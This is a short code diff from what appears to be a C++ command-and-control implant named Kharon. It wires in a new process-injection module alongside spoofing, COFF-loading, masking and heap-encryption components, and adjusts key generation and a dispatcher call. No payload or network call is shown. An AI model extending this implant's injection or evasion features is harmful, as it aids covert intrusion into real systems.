@@ -25,7 +25,9 @@ EXTERN_C DECLFN auto Main(
     Package   KhPackage( &Kh );
     Parser    KhParser( &Kh );
     Mask      KhMask( &Kh );
+    Injection khInject( &Kh );
 
+    Kh.InitInject( &khInject );
     Kh.InitCrypt( &KhCrypt );
     Kh.InitSpoof( &KhSpoof );
     Kh.InitCoff( &KhCoff );
@@ -168,7 +170,6 @@ auto DECLFN Kharon::Init(
     /* ========= [ key generation to xor heap and package ] ========= */
     for ( INT i = 0; i < sizeof( this->Crp->XorKey ); i++ ) {
         this->Crp->XorKey[i] = (BYTE)Rnd32();
-        this->Crp->LokKey[i] = (BYTE)Rnd32();
     }
 
     /* ========= [ informations collection ] ========= */
@@ -333,6 +334,6 @@ auto DECLFN Kharon::Start(
         //
         // start the dispatcher task routine
         //
-        this->Tk->Dispatcher();
+        this->Tsk->Dispatcher();
     } while( 1 );
 }
